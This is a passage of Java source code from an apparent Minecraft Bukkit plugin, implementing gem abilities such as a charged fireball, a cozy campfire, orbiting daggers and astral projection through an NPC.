        return CreateAstraGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined" + ChatColor.GRAY, 94);
    }


    private final HashMap<UUID, Integer> DaggersFired = new HashMap<>();
    private final Map<UUID, ArmorStand[]> playerArmorStands = new HashMap<>();


    @EventHandler
    public void ғɪʀᴇʙᴀʟʟ(PlayerInteractEvent ғɪʀᴇʙᴀʟʟ) {
        Player FireBallPlayer = ғɪʀᴇʙᴀʟʟ.getPlayer();
        UUID playerUUID = FireBallPlayer.getUniqueId();
        ItemStack FireGemItem = FireBallPlayer.getInventory().getItemInMainHand();
        if (ғɪʀᴇʙᴀʟʟ.getAction() == Action.LEFT_CLICK_AIR || ғɪʀᴇʙᴀʟʟ.getAction() == Action.LEFT_CLICK_BLOCK) {
            if (FireGem(FireGemItem)) {
                ItemMeta meta = FireGemItem.getItemMeta();
                PersistentDataContainer data = FireBallPlayer.getPersistentDataContainer();
                boolean ғɪʀᴇ_ʙᴀʟʟ = data.getOrDefault(FɪʀᴇBᴀʟʟ, PersistentDataType.INTEGER, 0) == 1;
                boolean ғɪʀᴇ_ʙᴀʟʟ_ᴘᴀʀᴛɪᴄʟᴇs = data.getOrDefault(FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!ғɪʀᴇ_ʙᴀʟʟ && !ғɪʀᴇ_ʙᴀʟʟ_ᴘᴀʀᴛɪᴄʟᴇs && !DISABLED_GEM) {
                    data.set(FɪʀᴇBᴀʟʟ, PersistentDataType.INTEGER, 1);
                    data.set(FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER, 1);
                    FireBallPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 129, 32)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "Charging " + ChatColor.WHITE + "\uD83E\uDDE8" + net.md_5.bungee.api.ChatColor.of(new Color(254, 129, 32)) + "fireball");
                    ғɪʀᴇʙᴀʟʟ.setCancelled(true);
                    if (FireBallChargingFireGem.containsKey(playerUUID)) return;
                    ArmorStand armorStand = createArmorStand(FireBallPlayer);
                    BossBar bossBar = createBossBar(FireBallPlayer);
                    FireBallChargingFireGem.put(playerUUID, Map.entry(armorStand, bossBar));
                    BossBarTimerTask(bossBar, playerUUID);
                    FireChargeArmorStand(armorStand, FireBallPlayer);
                    BissParticlesExtra(FireBallPlayer);
                }
            }
        }
    }


    @EventHandler
    public void DamageFireChargeArmorStand(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof ArmorStand && event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            ItemStack FireGemItem = player.getInventory().getItemInMainHand();
            UUID playerUUID = player.getUniqueId();
            PersistentDataContainer data = player.getPersistentDataContainer();
            if (FireGem(FireGemItem)) {
                data.set(FɪʀᴇBᴀʟʟ, PersistentDataType.INTEGER, 1);
                ItemMeta meta = FireGemItem.getItemMeta();
                int FireGemCustomModelData = meta.getCustomModelData();
                long FireBallCooldown;
                switch (FireGemCustomModelData) {
                    case 2:
                    case 22:
                        FireBallCooldown = 45;
                        break;
                    case 42:
                    case 62:
                        FireBallCooldown = 75;
                        break;
                    case 82:
                        FireBallCooldown = 95;
                        break;
                    default:
                        return;
                }
                FireGem_Power_1_FireBall.put(player.getUniqueId(), FireBallCooldown);
                FireGemActionbar(player);
                if (FireBallChargingFireGem.containsKey(playerUUID)) {
                    ArmorStand armorStand = FireBallChargingFireGem.get(playerUUID).getKey();
                    if (event.getEntity().equals(armorStand)) {
                        launchFireball(player, playerUUID);
                        FireBallPlayerData(playerUUID);
                        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 129, 32)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have launched a " + net.md_5.bungee.api.ChatColor.of(new Color(254, 129, 32)) + "fireball");
                        data.remove(FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs);
                    }
                }
            }
        }
    }


    private void launchFireball(Player player, UUID playerUUID) {
        var playerFireGemData = FireBallChargingFireGem.get(playerUUID);
        if (playerFireGemData != null) {
            Fireball fireball = player.launchProjectile(Fireball.class);
            fireball.setVelocity(player.getLocation().getDirection().multiply(2));
            fireball.setYield((float) (playerFireGemData.getValue().getProgress() * 10));
        }
    }

    private ArmorStand createArmorStand(Player player) {
        ArmorStand armorStand = player.getWorld().spawn(player.getLocation(), ArmorStand.class);
        armorStand.setInvisible(true);
        armorStand.setGravity(false);
        armorStand.getEquipment().setHelmet(new ItemStack(Material.FIRE_CHARGE));
        return armorStand;
    }

    private BossBar createBossBar(Player player) {
        BossBar bossBar = Bukkit.createBossBar("Fireball Charge", BarColor.RED, BarStyle.SOLID);
        bossBar.addPlayer(player);
        bossBar.setProgress(0.0);
        return bossBar;
    }

    private void BossBarTimerTask(BossBar bossBar, UUID playerUUID) {
        new BukkitRunnable() {
            double progress = bossBar.getProgress();

            @Override
            public void run() {
                if (progress < 1.0) {
                    progress += 0.1;
                    bossBar.setProgress(Math.min(progress, 1.0));
                } else {
                    this.cancel();
                }
            }
        }.runTaskTimer(this, 0L, 20L);
    }

    private void FireChargeArmorStand(ArmorStand armorStand, Player player) {
        new BukkitRunnable() {
            @Override
            public void run() {
                if (armorStand.isValid() && !armorStand.isDead()) {
                    armorStand.teleport(player.getLocation().add(0, 1, 0));
                } else {
                    FireBallPlayerData(player.getUniqueId());
                    this.cancel();
                }
            }
        }.runTaskTimer(this, 0L, 1L);
    }

    private void FireBallPlayerData(UUID playerUUID) {
        var playerFireGemData = this.FireBallChargingFireGem.get(playerUUID);
        if (playerFireGemData != null) {
            var armorStand = playerFireGemData.getKey();
            var bossBar = playerFireGemData.getValue();
            if (armorStand != null && !armorStand.isDead()) {
                armorStand.remove();
            }
            if (bossBar != null) {
                bossBar.removeAll();
            }
            FireBallChargingFireGem.remove(playerUUID);
        }
    }

    @EventHandler
    public void CozyCampfire(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        ItemStack FireGemItem = player.getInventory().getItemInMainHand();
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (FireGem(FireGemItem)) {
                PersistentDataContainer data = player.getPersistentDataContainer();
                boolean COZYCAMPFIRE = data.getOrDefault(Cozy_Campfire, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!COZYCAMPFIRE && !DISABLED_GEM) {
                    data.set(Cozy_Campfire, PersistentDataType.INTEGER, 1);
                    ItemMeta meta = FireGemItem.getItemMeta();
                    Block block = player.getTargetBlockExact(5);
                    if (block != null && block.getType() != Material.AIR) {
                        Location location = block.getLocation().add(0.5, 1, 0.5); // Get the location of the block above and center it
                        Block blockAbove = location.getBlock();
                        if (blockAbove.getType() != Material.CAMPFIRE) { // Check if the block above is not already a campfire
                            blockAbove.setType(Material.CAMPFIRE);
                            int customModelData = meta.getCustomModelData();
                            long CozyCampfireCooldown;
                            switch (customModelData) {
                                case 2:
                                    CozyCampfireCooldown = 240L;
                                    break;
                                case 22:
                                    CozyCampfireCooldown = 240L;
                                    break;
                                case 42:
                                    CozyCampfireCooldown = 360L;
                                    break;
                                case 62:
                                    CozyCampfireCooldown = 360L;
                                    break;
                                case 82:
                                    CozyCampfireCooldown = 480L;
                                    break;
                                default:
                                    return;
                            }
                            FireGem_Power_3_CozyCampfire.put(player.getUniqueId(), CozyCampfireCooldown);
                            FireGemActionbar(player);
                            ArmorStand armorStand = (ArmorStand) blockAbove.getWorld().spawnEntity(location, EntityType.ARMOR_STAND);
                            armorStand.setBasePlate(false);
                            armorStand.setCustomName("CozyCampfire");
                            armorStand.setInvulnerable(true);
                            armorStand.setMarker(true);
                            Location timerLocation = location.clone().add(0, 1.5, 0);
                            ArmorStand timerArmorStand = (ArmorStand) blockAbove.getWorld().spawnEntity(timerLocation, EntityType.ARMOR_STAND);
                            timerArmorStand.setVisible(true);
                            timerArmorStand.setBasePlate(false);
                            timerArmorStand.setCustomNameVisible(true);
                            timerArmorStand.setMarker(true);
                            new BukkitRunnable() {
                                int secondsRemaining = 600;

                                @Override
                                public void run() {
                                    if (secondsRemaining <= 0) {
                                        timerArmorStand.remove();
                                        blockAbove.setType(Material.AIR);
                                        armorStand.remove();
                                        cancel();
                                        return;
                                    }
                                    int minutes = secondsRemaining / 60;
                                    int seconds = secondsRemaining % 60;
                                    String timeDisplay = minutes > 0 ? minutes + "m " + seconds + "s" : seconds + "s";
                                    timerArmorStand.setCustomName(ChatColor.GREEN + timeDisplay);
                                    Location campfireLocation = armorStand.getLocation();
                                    if (player.getLocation().distanceSquared(campfireLocation) <= 17.5) { // 4 blocks radius squared
                                        player.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 40, 0, false, false, false)); // Saturation I for 2 seconds
                                    }
                                    secondsRemaining--;
                                }
                            }.runTaskTimer(this, 0, 20); // Update every second
                            new BukkitRunnable() {
                                @Override
                                public void run() {
                                    Location campfireLocation = armorStand.getLocation();
                                    double radius = 4.5;
                                    int numParticles = 256;
                                    double increment = 2 * Math.PI / numParticles;
                                    for (int i = 0; i < numParticles; i++) {
                                        double angle = i * increment;
                                        double x = campfireLocation.getX() + radius * Math.cos(angle);
                                        double z = campfireLocation.getZ() + radius * Math.sin(angle);
                                        Location particleLocation = new Location(campfireLocation.getWorld(), x, campfireLocation.getY(), z);
                                        campfireLocation.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 1, new Particle.DustOptions(org.bukkit.Color.fromRGB(255, 140, 0), 1));
                                    }
                                }
                            }.runTaskTimer(this, 0, 3); // Run every 10 ticks
                        }
                    }
                }
            }
        }
    }

    private void launchArmorStand(Player player) {
        Location eyeLocation = player.getEyeLocation();
        Location DaggerSpawn = eyeLocation.clone().add(0, -2, 0);
        ArmorStand armorStand = (ArmorStand) DaggerSpawn.getWorld().spawnEntity(DaggerSpawn, EntityType.ARMOR_STAND);
        armorStand.setVisible(false);
        armorStand.setBasePlate(false);
        armorStand.setCustomNameVisible(false);
        armorStand.setGravity(false);
        ItemStack nautilusShell = new ItemStack(Material.NAUTILUS_SHELL);
        ItemMeta shellMeta = nautilusShell.getItemMeta();
        if (shellMeta != null) {
            shellMeta.setCustomModelData(230);
            nautilusShell.setItemMeta(shellMeta);
        }
        armorStand.getEquipment().setHelmet(nautilusShell);
        Vector direction = eyeLocation.getDirection().normalize().multiply(0.7);
        armorStand.setVelocity(direction);
        new BukkitRunnable() {
            @Override
            public void run() {
                if (armorStand.isDead() || !armorStand.isValid()) {
                    this.cancel();
                    return;
                }
                armorStand.teleport(armorStand.getLocation().add(direction));
                List<Entity> nearbyEntities = armorStand.getNearbyEntities(0.5, 0.5, 0.5);

                for (Entity entity : nearbyEntities) {
                    if (entity instanceof Player && entity.getUniqueId().equals(player.getUniqueId())) {
                        continue;
                    }
                    if (entity instanceof LivingEntity) {
                        ((LivingEntity) entity).damage(6.0);
                    }
                }
                Location particleLocation = armorStand.getLocation().add(0, 1.8, 0); // Adjusting the Y level to be at the armor stand's head
                armorStand.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 1, new Particle.DustOptions(org.bukkit.Color.fromRGB(160, 31, 255), 1));
            }
        }.runTaskTimer(this, 1, 1);
    }

    @EventHandler
    public void ᴅᴀɢɢᴇʀs(PlayerInteractEvent ᴅᴀɢɢᴇʀs) {
        Player DaggersPlayer = ᴅᴀɢɢᴇʀs.getPlayer();
        ItemStack AstraGemItem = DaggersPlayer.getInventory().getItemInMainHand();
        UUID DaggerFired = DaggersPlayer.getUniqueId();
        int currentScore = DaggersFired.getOrDefault(DaggerFired, 0);
        if (ᴅᴀɢɢᴇʀs.getAction() == Action.LEFT_CLICK_AIR || ᴅᴀɢɢᴇʀs.getAction() == Action.LEFT_CLICK_BLOCK) {
            PersistentDataContainer data = DaggersPlayer.getPersistentDataContainer();
            boolean DᴀɢɢᴇʀsFɪʀᴇᴅ = data.getOrDefault(Dᴀɢɢᴇʀs, PersistentDataType.INTEGER, 0) == 1;
            boolean ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
            if (!DᴀɢɢᴇʀsFɪʀᴇᴅ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                if (AstraGem(AstraGemItem)) {
                    currentScore++;
                    DaggersFired.put(DaggerFired, currentScore);
                }
                if (currentScore == 3) {
                    UUID playerId = DaggersPlayer.getUniqueId();
                    ArmorStand[] DaggersArmorStand = new ArmorStand[5];
                    Location playerLocation = DaggersPlayer.getLocation();

                    for (int i = 0; i < 5; i++) {
                        DaggersArmorStand[i] = spawnArmorStand(playerLocation);
                    }
                    playerArmorStands.put(playerId, DaggersArmorStand);
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            if (!DaggersPlayer.isOnline() || !playerArmorStands.containsKey(playerId)) {
                                this.cancel();
                                return;
                            }
                            Location eyeLocation = DaggersPlayer.getEyeLocation();
                            Vector direction = eyeLocation.getDirection();
                            Location front = eyeLocation.clone().add(direction.clone().multiply(1.7)).add(0, -2, 0);
                            Location left = eyeLocation.clone().add(direction.clone().rotateAroundY(Math.toRadians(-45)).multiply(1.5)).add(0, -2, 0);
                            Location right = eyeLocation.clone().add(direction.clone().rotateAroundY(Math.toRadians(45)).multiply(1.5)).add(0, -2, 0);
                            Location backLeft = eyeLocation.clone().add(direction.clone().rotateAroundY(Math.toRadians(-70)).multiply(1.7)).add(0, -2, 0);
                            Location backRight = eyeLocation.clone().add(direction.clone().rotateAroundY(Math.toRadians(70)).multiply(1.7)).add(0, -2, 0);
                            DaggersArmorStand[0].teleport(front);
                            DaggersArmorStand[1].teleport(left);
                            DaggersArmorStand[2].teleport(right);
                            DaggersArmorStand[3].teleport(backLeft);
                            DaggersArmorStand[4].teleport(backRight);
                            DaggersArmorStand[0].setInvulnerable(true);
                            DaggersArmorStand[1].setInvulnerable(true);
                            DaggersArmorStand[2].setInvulnerable(true);
                            DaggersArmorStand[3].setInvulnerable(true);
                            DaggersArmorStand[4].setInvulnerable(true);
                        }
                    }.runTaskTimer(this, 0, 1);
                }
                if (currentScore == 6) {
                    launchArmorStand(DaggersPlayer);
                    UUID playerId = DaggersPlayer.getUniqueId();
                    if (playerArmorStands.containsKey(playerId)) {
                        ArmorStand[] daggersArmorStand = playerArmorStands.get(playerId);
                        daggersArmorStand[4].setInvulnerable(false);
                        if (daggersArmorStand[4] != null && !daggersArmorStand[4].isDead()) {
                            daggersArmorStand[4].remove();
                            daggersArmorStand[4] = null;
                            playerArmorStands.put(playerId, daggersArmorStand);
                        }
                    }
                }
                if (currentScore == 9) {
                    launchArmorStand(DaggersPlayer);
                    UUID playerId = DaggersPlayer.getUniqueId();
                    if (playerArmorStands.containsKey(playerId)) {
                        ArmorStand[] daggersArmorStand = playerArmorStands.get(playerId);
                        daggersArmorStand[3].setInvulnerable(false);
                        if (daggersArmorStand[3] != null && !daggersArmorStand[3].isDead()) {
                            daggersArmorStand[3].remove();
                            daggersArmorStand[3] = null;
                            playerArmorStands.put(playerId, daggersArmorStand);
                        }
                    }
                }
                if (currentScore == 12) {
                    launchArmorStand(DaggersPlayer);
                    UUID playerId = DaggersPlayer.getUniqueId();
                    if (playerArmorStands.containsKey(playerId)) {
                        ArmorStand[] daggersArmorStand = playerArmorStands.get(playerId);
                        daggersArmorStand[2].setInvulnerable(false);
                        if (daggersArmorStand[2] != null && !daggersArmorStand[2].isDead()) {
                            daggersArmorStand[2].remove();
                            daggersArmorStand[2] = null;
                            playerArmorStands.put(playerId, daggersArmorStand);
                        }
                    }
                }
                if (currentScore == 15) {
                    launchArmorStand(DaggersPlayer);
                    UUID playerId = DaggersPlayer.getUniqueId();
                    if (playerArmorStands.containsKey(playerId)) {
                        ArmorStand[] daggersArmorStand = playerArmorStands.get(playerId);
                        daggersArmorStand[1].setInvulnerable(false);
                        if (daggersArmorStand[1] != null && !daggersArmorStand[1].isDead()) {
                            daggersArmorStand[1].remove();
                            daggersArmorStand[1] = null;
                            playerArmorStands.put(playerId, daggersArmorStand);
                        }
                    }
                }
                if (currentScore == 18) {
                    launchArmorStand(DaggersPlayer);
                    UUID DaggerUUID = DaggersPlayer.getUniqueId();
                    int newScore = 0;
                    DaggersFired.put(DaggerUUID, newScore);
                    UUID playerId = DaggersPlayer.getUniqueId();
                    if (playerArmorStands.containsKey(playerId)) {
                        ArmorStand[] daggersArmorStand = playerArmorStands.get(playerId);
                        daggersArmorStand[0].setInvulnerable(false);
                        if (daggersArmorStand[0] != null && !daggersArmorStand[0].isDead()) {
                            daggersArmorStand[0].remove();
                            daggersArmorStand[0] = null;
                            playerArmorStands.put(playerId, daggersArmorStand);
                            data.set(Dᴀɢɢᴇʀs, PersistentDataType.INTEGER, 1);
                            ItemMeta meta = AstraGemItem.getItemMeta();
                            int AstraGemCustomModelData = meta.getCustomModelData();
                            long DaggersCooldown;
                            switch (AstraGemCustomModelData) {
                                case 14:
                                case 34:
                                    DaggersCooldown = 75;
                                    break;
                                case 54:
                                case 74:
                                    DaggersCooldown = 105;
                                    break;
                                case 94:
                                    DaggersCooldown = 135;
                                    break;
                                default:
                                    return;
                            }
                            AstraGem_Power_1_Daggers.put(DaggersPlayer.getUniqueId(), DaggersCooldown);
                            AstraGemActionbar(DaggersPlayer);
                        }
                    }
                }
            }
        }
    }

    private HashMap<UUID, NPC> AstralProjectionNPC = new HashMap<>();
    private final HashMap<UUID, ItemStack[]> AstralPlayerInventory = new HashMap<>();


    @EventHandler
    public void AstralProjection(PlayerInteractEvent AstralProjection) {
        Player AstralProjectionPlayer = AstralProjection.getPlayer();
        ItemStack AstraGemItem = AstralProjectionPlayer.getInventory().getItemInMainHand();
        if (AstralProjection.getAction() == Action.RIGHT_CLICK_AIR || AstralProjection.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (AstraGem(AstraGemItem)) {
                PersistentDataContainer data = AstralProjectionPlayer.getPersistentDataContainer();
                boolean ASTRAL_PROJECTION_PARTICLES = data.getOrDefault(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER, 0) == 1;
                boolean UNBOUND = data.getOrDefault(Uɴʙᴏᴜɴᴅ, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!UNBOUND && !ASTRAL_PROJECTION_PARTICLES && !DISABLED_GEM) {
                    data.set(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER, 1);
                    data.set(Uɴʙᴏᴜɴᴅ, PersistentDataType.INTEGER, 1);
                    String AstralProjectionPlayerName = AstralProjectionPlayer.getName();
                    NPC npc = CitizensAPI.getNPCRegistry().createNPC(EntityType.PLAYER, AstralProjectionPlayerName);
                    Location AstralProjectionPlayerLocation = AstralProjectionPlayer.getLocation();
                    BissParticlesExtra(AstralProjectionPlayer);
                    npc.spawn(AstralProjectionPlayerLocation);
                    npc.getNavigator().cancelNavigation();
                    Equipment equipment = npc.getOrAddTrait(Equipment.class);
                    ItemStack Hᴇʟᴍᴇᴛ = AstralProjectionPlayer.getInventory().getHelmet();
                    ItemStack Cʜᴇsᴛᴘʟᴀᴛᴇ = AstralProjectionPlayer.getInventory().getChestplate();
                    ItemStack Lᴇɢɢɪɴɢs = AstralProjectionPlayer.getInventory().getLeggings();
                    ItemStack Bᴏᴏᴛs = AstralProjectionPlayer.getInventory().getBoots();
                    ItemStack IᴛᴇᴍIɴOғғHᴀɴᴅ = AstralProjectionPlayer.getInventory().getItemInOffHand();
                    ItemStack IᴛᴇᴍIɴMᴀɪɴHᴀɴᴅ = AstralProjectionPlayer.getInventory().getItemInMainHand();
                    equipment.set(Equipment.EquipmentSlot.HELMET, Hᴇʟᴍᴇᴛ);
                    equipment.set(Equipment.EquipmentSlot.CHESTPLATE, Cʜᴇsᴛᴘʟᴀᴛᴇ);
                    equipment.set(Equipment.EquipmentSlot.LEGGINGS, Lᴇɢɢɪɴɢs);
                    equipment.set(Equipment.EquipmentSlot.BOOTS, Bᴏᴏᴛs);
                    equipment.set(Equipment.EquipmentSlot.OFF_HAND, IᴛᴇᴍIɴOғғHᴀɴᴅ);
                    equipment.set(Equipment.EquipmentSlot.HAND, IᴛᴇᴍIɴMᴀɪɴHᴀɴᴅ);
                    AstralProjectionNPC.put(AstralProjectionPlayer.getUniqueId(), npc);
                    AstralProjectionPlayer.setInvulnerable(true);
                    AstralProjectionPlayer.setAllowFlight(true);
                    AstralProjectionPlayer.setInvisible(true);
                    AstralProjectionPlayer.getInventory().clear();
                    AstralProjectionPlayer.getInventory().addItem(AstraGemPristine(11));
                }
            }
        }
    }


    @EventHandler
    public void AstralEntityDamage(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player AstralHitEntityPlayer = (Player) event.getDamager();
            Entity AstralHitEntity = event.getEntity();
            if (AstralProjectionNPC.containsKey(AstralHitEntityPlayer.getUniqueId())) {
                NPC npc = AstralProjectionNPC.get(AstralHitEntityPlayer.getUniqueId());
                if (npc != null) {
                    AstralHitEntityPlayer.teleport(npc.getStoredLocation());
                    AstralHitEntityPlayer.setAllowFlight(false);
                    AstralHitEntityPlayer.setInvisible(false);
                    AstralHitEntityPlayer.setInvulnerable(false);
                    if (AstralHitEntityPlayer.getGameMode() == GameMode.CREATIVE)
                        AstralHitEntityPlayer.setAllowFlight(true);
                    npc.destroy();
                    AstralProjectionNPC.remove(AstralHitEntityPlayer.getUniqueId());
                    PersistentDataContainer data = AstralHitEntityPlayer.getPersistentDataContainer();
                    data.remove(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs);
                    AstralHitEntityPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "Spooked " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + AstralHitEntity.getName() + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + " for " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "10 " + ChatColor.GRAY + "seconds");
                    if (AstralHitEntity instanceof LivingEntity) {
                        LivingEntity AstralHitEntityLivingEntity = (LivingEntity) AstralHitEntity;
                        AstralHitEntityLivingEntity.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 200, 0, true));
                        AstralHitEntityLivingEntity.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have been Spooked by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + AstralHitEntityPlayer.getName() + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + " for " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "10 " + ChatColor.GRAY + "seconds");
                    }
                }
            }
        }
    }


    @EventHandler
    public void NPCDamage(NPCDamageByEntityEvent event) {
        NPC npc = event.getNPC();
        if (npc != null && AstralProjectionNPC.containsValue(npc)) {
            Player player = (Player) event.getDamager();
            if (player != null && AstralProjectionNPC.get(player.getUniqueId()).equals(npc)) {
                player.teleport(npc.getStoredLocation());
                npc.destroy();
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.remove(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs);
                AstralProjectionNPC.remove(player.getUniqueId());
                player.setAllowFlight(false);
                player.setInvisible(false);
                player.setInvulnerable(false);
                if (player.getGameMode() == GameMode.CREATIVE)
                    player.setAllowFlight(true);
            }
        }
    }

    private void equipNPCWithPlayerInventory(NPC npc, UUID playerUUID) {
        ItemStack[] playerInventory = AstralPlayerInventory.get(playerUUID);
        if (playerInventory != null) {
            org.bukkit.entity.Entity entity = npc.getEntity();
            if (entity instanceof org.bukkit.entity.LivingEntity) {
                org.bukkit.entity.LivingEntity livingEntity = (org.bukkit.entity.LivingEntity) entity;
                livingEntity.getEquipment().clear();
                livingEntity.getEquipment().setArmorContents(new ItemStack[]{
                        playerInventory[36], // Boots
                        playerInventory[37], // Leggings
                        playerInventory[38], // Chestplate
                        playerInventory[39]  // Helmet
                });
                livingEntity.getEquipment().setItemInMainHand(playerInventory[0]);
                livingEntity.getEquipment().setItemInOffHand(playerInventory[1]);
            }
        }
    }

    @EventHandler
    public void tffffffffhell(EntityDeathEvent event) {
        Entity deadEntity = event.getEntity();
        Location deathLocation = deadEntity.getLocation().add(0, 1, 0);
        if (deadEntity.getType() == EntityType.PLAYER) {
            return;
        }
        if (deadEntity.getLastDamageCause() instanceof org.bukkit.event.entity.EntityDamageByEntityEvent) {
            org.bukkit.event.entity.EntityDamageByEntityEvent damageEvent = (org.bukkit.event.entity.EntityDamageByEntityEvent) deadEntity.getLastDamageCause();
            if (damageEvent.getDamager() instanceof Player) {
                Player player = (Player) damageEvent.getDamager();
                ItemStack AstraGemItem = player.getInventory().getItemInOffHand();
                if (AstraGem(AstraGemItem)) {
                    spawnParticleSphere(deathLocation);
                }
            }
        }
    }


    private void spawnParticleSphere(Location center) {
        for (double theta = 0; theta < Math.PI * 2; theta += Math.PI / 8) {
            for (double phi = 0; phi < Math.PI * 2; phi += Math.PI / 8) {
                double x = 0.2 * Math.cos(phi) * Math.sin(theta);
                double y = 0.2 * Math.sin(phi) * Math.sin(theta);
                double z = 0.2 * Math.cos(theta);

                Location particleLocation = center.clone().add(x, y, z);
                Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(160, 31, 255), 1);
                center.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 5, 0, 0, 0, 1, BlissParticleOptions);
            }
        }
    }


    private void BissParticlesExtra(Player player) {
        new BukkitRunnable() {
            @Override
            public void run() {
                if (!player.isOnline()) {
                    this.cancel();
                    return;
                }
                if (player.getPersistentDataContainer().has(AsᴛʀᴀʟPʀᴏᴊᴇᴄᴛɪᴏɴPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER)) {
                    Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(160, 31, 255), 1);
                    player.getWorld().spawnParticle(Particle.REDSTONE, player.getLocation().add(0, 1, 0), 10, 0.5, 0.5, 0.5, 0, BlissParticleOptions, true);
                }
                if (player.getPersistentDataContainer().has(FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER)) {
                    Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(255, 140, 0), 1);
                    player.getWorld().spawnParticle(Particle.REDSTONE, player.getLocation().add(0, 1, 0), 10, 0.5, 0.5, 0.5, 0, BlissParticleOptions, true);
                    player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, player.getLocation().add(0, 1, 0), 10, 0.5, 0.5, 0.5, 0, BlissParticleOptions, true);
                }
            }
        }.runTaskTimer(this, 0, 20);
    }

    @EventHandler
    public void onEntityDeath(EntityDeathEvent event) {
        Entity entity = event.getEntity();

        if (entity instanceof Player) {
            Player player = (Player) entity;

            // Check if the player is holding the AstraGem in the off-hand
            ItemStack AstraGemItem = player.getInventory().getItemInOffHand();
            if (AstraGem(AstraGemItem)) {
                Location entityLocation = entity.getLocation();
                Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(160, 31, 255), 3);
                entityLocation.getWorld().spawnParticle(Particle.REDSTONE, entityLocation, 10, 0.5, 0.5, 0.5, 0, BlissParticleOptions, true);
            }
        }
    }


    private ArmorStand spawnArmorStand(Location location) {
        ArmorStand armorStand = location.getWorld().spawn(location, ArmorStand.class);
        armorStand.setInvisible(true);
        armorStand.setInvulnerable(true);
        armorStand.setGravity(false);
        armorStand.setMarker(true);
        ItemStack nautilusShell = new ItemStack(Material.NAUTILUS_SHELL);
        ItemMeta meta = nautilusShell.getItemMeta();
        if (meta != null) {
            meta.setCustomModelData(230);
            nautilusShell.setItemMeta(meta);
        }
        armorStand.getEquipment().setHelmet(nautilusShell);

        return armorStand;
    }


    @EventHandler
    public void PuffGemDash(PlayerInteractEvent PuffGemDash) {
        Player PuffGemDashPlayer = PuffGemDash.getPlayer();
        ItemStack PuffGemItem = PuffGemDashPlayer.getInventory().getItemInMainHand();
        if (PuffGemDash.getAction() == Action.RIGHT_CLICK_AIR || PuffGemDash.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (PuffGem(PuffGemItem)) {
                ItemMeta meta = PuffGemItem.getItemMeta();
                PersistentDataContainer data = PuffGemDashPlayer.getPersistentDataContainer();
                boolean DASH = data.getOrDefault(Dash, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!DASH && !DISABLED_GEM) {
                    data.set(Dash, PersistentDataType.INTEGER, 1);
                    int customModelData = meta.getCustomModelData();
                    long PuffGemDashCooldown;
